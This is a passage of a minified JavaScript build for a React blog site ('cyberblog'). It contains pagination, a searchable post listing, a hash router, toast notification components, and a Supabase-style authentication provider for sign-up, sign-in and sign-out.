h=Math.max(1,n-Math.floor(d/2)),p=Math.min(t,h+d-1);p-h+1<d&&(h=Math.max(1,p-d+1));for(let f=h;f<=p;f++)c.push(f);return x.jsxs("div",{className:"flex items-center justify-center space-x-2 mt-12",children:[x.jsx($t,{variant:"outline",size:"icon",onClick:s,disabled:n===1,"aria-label":"Go to previous page",children:x.jsx(hw,{className:"h-5 w-5"})}),h>1&&x.jsxs(x.Fragment,{children:[x.jsx($t,{variant:"outline",onClick:()=>r(1),children:"1"}),h>2&&x.jsx("span",{className:"text-muted-foreground",children:"..."})]}),c.map(f=>x.jsx($t,{variant:n===f?"default":"outline",onClick:()=>r(f),"aria-current":n===f?"page":void 0,children:f},f)),p<t&&x.jsxs(x.Fragment,{children:[p<t-1&&x.jsx("span",{className:"text-muted-foreground",children:"..."}),x.jsx($t,{variant:"outline",onClick:()=>r(t),children:t})]}),x.jsx($t,{variant:"outline",size:"icon",onClick:a,disabled:n===t,"aria-label":"Go to next page",children:x.jsx(pw,{className:"h-5 w-5"})})]})},Mc=9,lS=({searchTerm:n,setSearchTerm:t})=>{const{theme:r}=zi(),[s,a]=S.useState(1),[c,d]=S.useState([]),h=S.useMemo(()=>{let R=[...Pd];return n&&(R=R.filter(M=>M.title.toLowerCase().includes(n.toLowerCase())||M.summary.toLowerCase().includes(n.toLowerCase())||M.tags&&M.tags.some(L=>L.toLowerCase().includes(n.toLowerCase())))),R.sort((M,L)=>new Date(L.date)-new Date(M.date))},[n]),p=Math.ceil(h.length/Mc);S.useEffect(()=>{const R=(s-1)*Mc,M=R+Mc;d(h.slice(R,M)),(n||s>1)&&window.scrollTo({top:0,behavior:"smooth"})},[s,h,n]);const f=R=>{a(R)},m=S.useCallback(R=>{t(R.target.value),a(1)},[t]),y=S.useCallback(()=>{t(""),a(1)},[t]),v={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},w=r==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",E=r==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",T=r==="dark"?"text-slate-400":"text-muted-foreground",C=r==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",O=r==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return x.jsxs("div",{className:"space-y-12",children:[x.jsxs(et.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${w} rounded-xl shadow-lg p-8`,children:[x.jsx(dw,{size:48,className:`mx-auto mb-4 ${E}`}),x.jsx("h1",{className:`text-4xl md:text-5xl font-bold mb-6 ${E}`,children:"All Blog Posts"}),x.jsx("p",{className:`text-lg md:text-xl ${T} max-w-3xl mx-auto mb-10`,children:"Browse through our entire collection of articles. Use the search to find specific topics."}),x.jsxs("div",{className:"relative max-w-xl mx-auto group",children:[x.jsx(Tg,{className:`absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 ${O} transition-colors`}),x.jsx(aa,{type:"search",placeholder:"Search all articles...",className:`w-full py-3 pl-12 pr-10 rounded-lg border outline-none transition-all ${C}`,value:n,onChange:m}),n&&x.jsx("button",{onClick:y,className:"absolute right-3 top-1/2 transform -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors","aria-label":"Clear search",children:x.jsx(Vo,{size:20})})]})]}),n&&h.length>0&&x.jsxs(et.div,{initial:{opacity:0},animate:{opacity:1},className:"text-center mb-8",children:[x.jsxs("h2",{className:"text-2xl font-semibold text-foreground",children:["Search Results for: ",x.jsx("span",{className:"text-primary",children:n})]}),x.jsxs("p",{className:"text-muted-foreground",children:[h.length," post(s) found."]})]}),h.length===0&&x.jsxs(et.div,{initial:{opacity:0,y:10},animate:{opacity:1,y:0},className:"text-center py-10",children:[x.jsx(Vo,{size:48,className:"mx-auto text-destructive mb-4"}),x.jsx("h2",{className:"text-2xl font-semibold text-foreground mb-2",children:"No Articles Found"}),x.jsx("p",{className:"text-muted-foreground",children:n?`Sorry, we couldn't find any articles matching "${n}". Try a different search term.`:"There are no articles available at the moment. Check back soon!"})]}),c.length>0&&x.jsx(et.section,{variants:v,initial:"hidden",animate:"visible",className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8",children:c.map(R=>x.jsx(cy,{post:R},R.id))}),p>1&&c.length>0&&x.jsx(aS,{currentPage:s,totalPages:p,onPageChange:f})]})},cS=()=>{const[n,t]=S.useState(window.location.hash||"#/"),[r,s]=S.useState(null),[a,c]=S.useState("");S.useEffect(()=>{const p=()=>{const f=window.location.hash||"#/";t(f),f.startsWith("#/post/")?s(f.substring(7)):s(null)};return window.addEventListener("hashchange",p),p(),()=>{window.removeEventListener("hashchange",p)}},[]);const d=S.useCallback(p=>{c(p)},[]),h=()=>{let p,f={};return n==="#/"||n==="#"?(p=E2,f={searchTerm:a,setSearchTerm:d}):n==="#/all-blogs"?(p=lS,f={searchTerm:a,setSearchTerm:d}):n.startsWith("#/post/")&&r?(p=oS,f={postId:r}):p=dy,x.jsx(p,{...f})};return x.jsx($1,{routeKey:n,children:h()})},dS=gT,Jy=Pe.forwardRef(({className:n,...t},r)=>x.jsx(My,{ref:r,className:yt("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",n),...t}));Jy.displayName=My.displayName;const uS=ly("data-[swipe=move]:transition-none group relative pointer-events-auto flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full data-[state=closed]:slide-out-to-right-full",{variants:{variant:{default:"bg-background border",destructive:"group destructive border-destructive bg-destructive text-destructive-foreground"}},defaultVariants:{variant:"default"}}),Qy=Pe.forwardRef(({className:n,variant:t,...r},s)=>x.jsx(jy,{ref:s,className:yt(uS({variant:t}),n),...r}));Qy.displayName=jy.displayName;const hS=Pe.forwardRef(({className:n,...t},r)=>x.jsx(By,{ref:r,className:yt("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-destructive/30 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive",n),...t}));hS.displayName=By.displayName;const Yy=Pe.forwardRef(({className:n,...t},r)=>x.jsx(Ny,{ref:r,className:yt("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",n),"toast-close":"",...t,children:x.jsx(Sw,{className:"h-4 w-4"})}));Yy.displayName=Ny.displayName;const Xy=Pe.forwardRef(({className:n,...t},r)=>x.jsx(Ly,{ref:r,className:yt("text-sm font-semibold",n),...t}));Xy.displayName=Ly.displayName;const Zy=Pe.forwardRef(({className:n,...t},r)=>x.jsx(Oy,{ref:r,className:yt("text-sm opacity-90",n),...t}));Zy.displayName=Oy.displayName;function pS(){const{toasts:n}=Ld();return x.jsxs(dS,{children:[n.map(({id:t,title:r,description:s,action:a,...c})=>x.jsxs(Qy,{...c,children:[x.jsxs("div",{className:"grid gap-1",children:[r&&x.jsx(Xy,{children:r}),s&&x.jsx(Zy,{children:s})]}),a,x.jsx(Yy,{})]},t)),x.jsx(Jy,{})]})}const fS=S.createContext(void 0),gS=({children:n})=>{const{toast:t}=Ld(),[r,s]=S.useState(null),[a,c]=S.useState(null),[d,h]=S.useState(!0),p=S.useCallback(async w=>{c(w),s(w?.user??null),h(!1)},[]);S.useEffect(()=>{(async()=>{const{data:{session:T}}=await qe.auth.getSession();p(T)})();const{data:{subscription:E}}=qe.auth.onAuthStateChange(async(T,C)=>{p(C)});return()=>E.unsubscribe()},[p]);const f=S.useCallback(async(w,E,T)=>{const{error:C}=await qe.auth.signUp({email:w,password:E,options:T});return C&&t({variant:"destructive",title:"Sign up Failed",description:C.message||"Something went wrong"}),{error:C}},[t]),m=S.useCallback(async(w,E)=>{const{error:T}=await qe.auth.signInWithPassword({email:w,password:E});return T&&t({variant:"destructive",title:"Sign in Failed",description:T.message||"Something went wrong"}),{error:T}},[t]),y=S.useCallback(async()=>{const{error:w}=await qe.auth.signOut();return w&&t({variant:"destructive",title:"Sign out Failed",description:w.message||"Something went wrong"}),{error:w}},[t]),v=S.useMemo(()=>({user:r,session:a,loading:d,signUp:f,signIn:m,signOut:y}),[r,a,d,f,m,y]);return x.jsx(fS.Provider,{value:v,children:n})};ow.createRoot(document.getElementById("root")).render(x.jsx(Pe.StrictMode,{children:x.jsxs(V1,{defaultTheme:"light",storageKey:"cyberblog-theme",children:[x.jsx(gS,{children:x.jsx(cS,{})}),x.jsx(pS,{})]})}));export{nd as g};
